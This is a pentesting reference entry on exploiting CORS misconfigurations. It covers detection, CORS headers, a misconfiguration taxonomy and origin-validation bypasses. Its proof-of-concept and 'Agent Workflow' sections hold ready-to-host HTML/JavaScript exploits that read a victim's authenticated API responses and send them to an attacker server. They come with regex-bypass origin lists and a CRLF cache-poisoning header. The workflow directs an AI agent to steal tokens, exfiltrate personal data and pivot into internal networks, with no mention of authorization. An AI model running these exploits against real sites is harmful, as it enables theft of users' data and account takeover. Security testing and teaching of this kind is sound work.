# CORS (Cross-Origin Resource Sharing) Misconfiguration

> **Summary**: Exploiting misconfigured CORS policies to make cross-origin requests that read sensitive data from a victim's authenticated session.
> **Impact**: Sensitive data exfiltration (PII, tokens, API keys), account takeover, internal network access via victim's browser.
> **Typical Severity**: High (with credentials) | Medium (without credentials)

---

## Detection

### Indicators
- `Access-Control-Allow-Origin` header reflects the `Origin` request header value
- `Access-Control-Allow-Origin: null` is present
- `Access-Control-Allow-Credentials: true` combined with a permissive origin
- Wildcard `*` used with sensitive endpoints (though browsers block credentials with wildcard)
- Regex-based origin validation with bypassable patterns

### Automated Detection
```bash
# Corsy - CORS misconfiguration scanner
# https://github.com/s0md3v/Corsy
python3 corsy.py -u https://example.com

# Manual curl test
curl -s -I -H "Origin: https://evil.com" https://<TARGET>/api/sensitive | grep -i "access-control"
```

### Manual Detection
1. Send a request with `Origin: https://evil.com` and check if it is reflected in `Access-Control-Allow-Origin`
2. Test `Origin: null` (sandboxed iframes send null origin)
3. Test subdomain variations: `Origin: https://evil.target.com`, `Origin: https://target.com.evil.com`
4. Check if `Access-Control-Allow-Credentials: true` is returned alongside a permissive origin
5. Look for JSONP endpoints as alternative cross-origin data access

---

## Background

### CORS Headers

| Header | Direction | Purpose |
|--------|-----------|---------|
| `Access-Control-Allow-Origin` | Response | Origins allowed to read the response |
| `Access-Control-Allow-Credentials` | Response | Whether cookies/auth headers are included |
| `Access-Control-Allow-Methods` | Response | Allowed HTTP methods for preflight |
| `Access-Control-Allow-Headers` | Response | Allowed request headers for preflight |
| `Access-Control-Expose-Headers` | Response | Response headers readable by JS |
| `Access-Control-Max-Age` | Response | Preflight cache duration (seconds) |
| `Access-Control-Request-Method` | Request | Method intended for actual request (preflight) |
| `Access-Control-Request-Headers` | Request | Headers intended for actual request (preflight) |

### Simple Requests vs Preflight Requests

**Simple Requests** (no preflight):
- `GET`, `HEAD`, or `POST` method
- No custom headers
- Content-Type is one of: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`

**Preflighted Requests**:
- Any other method (`PUT`, `DELETE`, `PATCH`)
- Custom headers present
- Content-Type is `application/json` or similar
- An `OPTIONS` preflight request is sent first

> CORS does not protect against CSRF. A simple POST form submission does not trigger preflight and is not blocked by CORS.

---

## Exploitation

### Prerequisites
- `Access-Control-Allow-Credentials: true` (for most impactful attacks -- allows cookie/session inclusion)
- Permissive `Access-Control-Allow-Origin` (reflected origin, null, regex bypass)
- Victim must visit attacker-controlled page while authenticated to the target

### CORS Misconfiguration Taxonomy

| Misconfiguration | Description | Exploitable? |
|------------------|-------------|--------------|
| Origin reflection | Server reflects any `Origin` value back in ACAO header | Yes |
| `null` origin trusted | `Access-Control-Allow-Origin: null` is accepted | Yes (via sandboxed iframe) |
| Regex bypass | Weak regex allows `evil-target.com` or `target.com.evil.com` | Yes |
| Subdomain trust | Any subdomain is trusted (e.g., `*.target.com`) | Yes (if XSS on any subdomain) |
| Wildcard with credentials | `ACAO: *` + `ACAC: true` | No (browsers block this) |
| Wildcard without credentials | `ACAO: *` without `ACAC: true` | Low impact (no cookies sent) |
| Pre-domain wildcard | `Origin: target.com.evil.com` accepted | Yes |
| Post-domain injection | `Origin: evil-target.com` accepted | Yes |

### Step-by-Step

1. **Identify sensitive endpoints** - API endpoints that return user data, tokens, or PII
2. **Test origin reflection** - send requests with crafted `Origin` headers
3. **Verify credentials inclusion** - check for `Access-Control-Allow-Credentials: true`
4. **Craft exploit page** - create HTML/JS that makes the cross-origin request
5. **Host and deliver** - serve the exploit and have the victim visit it
6. **Exfiltrate data** - capture the response and send it to attacker server

**Success criteria**: Attacker-controlled page can read authenticated responses from the target

### Proof of Concept

#### Basic Origin Reflection Exploit
```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  // Send stolen data to attacker
  fetch("https://<ATTACKER>/log?data=" + encodeURIComponent(this.responseText));
};
req.open("GET", "https://<TARGET>/api/user/profile", true);
req.withCredentials = true;
req.send();
</script>
```

#### Null Origin Exploit (via sandboxed iframe)
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    location='https://<ATTACKER>/log?data='+encodeURIComponent(this.responseText);
  };
  req.open('get','https://<TARGET>/api/user/profile',true);
  req.withCredentials = true;
  req.send();
</script>"></iframe>
```

#### Data Exfiltration (POST + Read Response)
```html
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='result'></p>
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      var data = this.responseText;
      document.getElementById("result").innerHTML = data;
      // Exfiltrate
      xhttp.open("POST", "https://<ATTACKER>/collect", true);
      xhttp.send("data=" + data);
    }
  };
  xhttp.open("POST", "https://<TARGET>/api/sensitive", true);
  xhttp.withCredentials = true;
  var body = "requestcontent";
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
    aBody[i] = body.charCodeAt(i);
  xhttp.send(new Blob([aBody]));
}
</script>
</body>
</html>
```

#### JSONP Exploit (Bypasses CORS entirely)
```html
<script>
function steal(data) {
  fetch("https://<ATTACKER>/log", {
    method: "POST",
    body: JSON.stringify(data)
  });
}
</script>
<script src="https://<TARGET>/api/user?callback=steal"></script>
```

---

## Bypasses

### Regex Bypass Techniques
If origin validation uses regex, try:
```
https://target.com.evil.com         # Prepend target as subdomain of attacker
https://evil-target.com             # Hyphenated domain
https://targeta.com                 # Appended character
https://target.com%60.evil.com      # Special chars (backtick)
https://target.com_.evil.com        # Underscore (Chrome/Firefox accept in subdomains)
https://target.com}.evil.com        # Curly brace (Safari accepts)
```

### Special Characters in Domains
- Chrome and Firefox support underscores `_` in subdomains
- Safari accepts additional special characters like `}`, `{`, `|` in domain names
- These can bypass regex patterns that only match `[a-zA-Z0-9.-]`

### XSS on Trusted Subdomain
If CORS trusts `*.target.com` and any subdomain has XSS, the attacker can:
1. Exploit XSS on `vulnerable.target.com`
2. From that context, make cross-origin requests to `api.target.com`
3. Cookies and credentials will be included since it is same-site

### Pre-flight Bypass
Simple requests (GET/POST with standard content types) skip preflight. If the sensitive endpoint accepts simple requests, CORS misconfigurations can be exploited without needing the server to respond to OPTIONS.

### Server-Side Cache Poisoning via CORS
If the `Origin` header value is reflected without sanitization and the response is cached:
1. Inject CRLF via Origin header: `Origin: z\r\nContent-Type: text/html; charset=UTF-7`
2. Poisoned cache serves the manipulated response to other users
3. Can lead to stored XSS via cache

### Client-Side Cache Poisoning
If a response reflects a custom header (e.g., `X-User-Id`) without encoding:
1. Inject JavaScript via the header value
2. Combine with CORS misconfiguration to set the header cross-origin
3. Poisoned response executes in victim's browser

### Network Location as Authentication
When internal network access serves as implicit authentication (intranet apps), CORS misconfiguration allows using the victim's browser as a proxy to access internal resources, even without cookies.

---

## Escalation
- **Data theft**: read authenticated API responses containing PII, tokens, secrets
- **Account takeover**: exfiltrate CSRF tokens or session data, then use them
- **Internal network pivot**: exploit CORS to access internal services via victim's browser
- **Chain with [CSRF](csrf.md)**: CORS misconfig may enable reading CSRF tokens cross-origin
- **Chain with [XSS](xss.md)**: XSS on trusted subdomain enables full CORS exploitation
- See also: [Cookie-Based Attacks](cookie-based-attacks.md), [Cache Poisoning](cache-deception.md)

---

## Tools

| Tool | Usage |
|------|-------|
| [Corsy](https://github.com/s0md3v/Corsy) | `python3 corsy.py -u <URL>` - CORS misconfiguration scanner |
| [CORScanner](https://github.com/chenjj/CORScanner) | `python cors_scan.py -u <URL>` - bulk CORS testing |
| [Burp Suite](https://portswigger.net/) | Manual testing with Origin header manipulation |
| curl | `curl -H "Origin: https://evil.com" -I <URL>` |

---

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery
1. Identify sensitive API endpoints on `<TARGET>` that return user data, tokens, PII, or secrets (e.g., `/api/user/profile`, `/api/account`, `/api/keys`)
2. For each endpoint, send a request with `Origin: https://evil.com` and inspect the response for `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials` headers
3. Check if the `Origin` value is reflected verbatim in `Access-Control-Allow-Origin`
4. Test with `Origin: null` (sent by sandboxed iframes and data URIs)
5. Run automated scanner: `python3 corsy.py -u https://<TARGET>`
6. Look for JSONP endpoints (`?callback=`) as alternative cross-origin data access vectors

### Phase 2: Validation
1. **Reflected origin**: Send `Origin: https://evil.com` -- if `ACAO: https://evil.com` + `ACAC: true` is returned, the misconfiguration is confirmed
2. **Null origin**: Send `Origin: null` -- if `ACAO: null` + `ACAC: true`, exploitable via sandboxed iframe
3. **Regex bypass**: Test subdomain-style bypasses:
   - `Origin: https://evil.target.com` (suffix match)
   - `Origin: https://target.com.evil.com` (pre-domain)
   - `Origin: https://evil-target.com` (hyphenated)
   - `Origin: https://target.com_.evil.com` (underscore in subdomain)
4. **Subdomain trust**: If `*.target.com` is trusted, check if any subdomain has XSS -- if so, that XSS becomes a CORS exploitation vector
5. **Wildcard + credentials**: `ACAO: *` with `ACAC: true` is blocked by browsers (not exploitable), but `ACAO: *` without credentials still allows reading non-authenticated responses
6. Confirm that the endpoint returns sensitive data in the response body (not just headers)

### Phase 3: Exploitation
1. **Reflected origin exploit**: Create an HTML page that makes a cross-origin request with credentials:
   ```html
   <script>
   fetch("https://<TARGET>/<SENSITIVE_ENDPOINT>", {credentials: "include"})
     .then(r => r.text())
     .then(d => fetch("https://<ATTACKER>/log?data=" + encodeURIComponent(d)));
   </script>
   ```
2. **Null origin exploit**: Use a sandboxed iframe to send requests with `Origin: null`:
   ```html
   <iframe sandbox="allow-scripts" src="data:text/html,<script>
     var r=new XMLHttpRequest();r.open('GET','https://<TARGET>/<ENDPOINT>',true);
     r.withCredentials=true;r.onload=function(){location='https://<ATTACKER>/log?d='+encodeURIComponent(r.responseText)};
     r.send();
   </script>"></iframe>
   ```
3. Host the PoC on `<ATTACKER_SERVER>` and have an authenticated victim visit the page
4. Verify that the response data from `<TARGET>` is successfully read and exfiltrated

### Phase 4: Escalation
1. **Token theft**: If the API response contains session tokens, API keys, or CSRF tokens, use them for account takeover
2. **PII exfiltration**: Enumerate sensitive endpoints to extract personal data (email, address, payment info)
3. **Internal network pivot**: If CORS trusts any origin and the victim is on a corporate network, use the victim's browser to read responses from internal services
4. Chain with [XSS](xss.md): if a trusted subdomain has XSS, exploit it to make CORS-authenticated requests from the trusted origin
5. Chain with [Cache Poisoning](cache-poisoning.md): poison the `Access-Control-Allow-Origin` header in cached responses

## Decision Tree

```
Send Origin: https://evil.com
├── ACAO reflects evil.com + ACAC: true → Fully exploitable (steal authenticated data)
├── ACAO reflects evil.com, no ACAC → Can read unauthenticated responses only
└── ACAO does not reflect
    ├── Send Origin: null
    │   └── ACAO: null + ACAC: true → Exploit via sandboxed iframe
    ├── Test regex bypasses (suffix, prefix, special chars)
    │   └── Any accepted? → Exploit with matching domain
    ├── Test subdomain trust (*.target.com)
    │   └── XSS on any subdomain? → Full CORS exploitation from trusted subdomain
    └── ACAO: * (wildcard)
        ├── ACAC: true → Browser blocks (not exploitable)
        └── No ACAC → Can read public responses only (low impact)
```

## Success Criteria
- Sensitive data (user profile, tokens, API keys, PII) from `<TARGET>` is successfully read by JavaScript running on an attacker-controlled origin
- The attack works with the victim's authenticated session (cookies/credentials included)
- Data is exfiltrated to `<ATTACKER_SERVER>` and confirmed in server logs

---

## References

| URL | Description |
|-----|-------------|
| [HackTricks CORS](https://book.hacktricks.xyz/pentesting-web/cors-bypass) | Comprehensive CORS bypass techniques |
| [PortSwigger CORS](https://portswigger.net/web-security/cors) | CORS labs and learning |
| [CORS Exploitation for Bitcoins and Bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties) | Original CORS research |
| [Advanced CORS Techniques](https://www.corben.io/advanced-cors-techniques/) | Regex bypass research |
| [Think Outside the Scope](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397) | Advanced exploitation |
| [MDN CORS Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) | Official documentation |
| [URL Validation Bypass Cheat Sheet](https://portswigger.net/research/introducing-the-url-validation-bypass-cheat-sheet) | Special character testing |
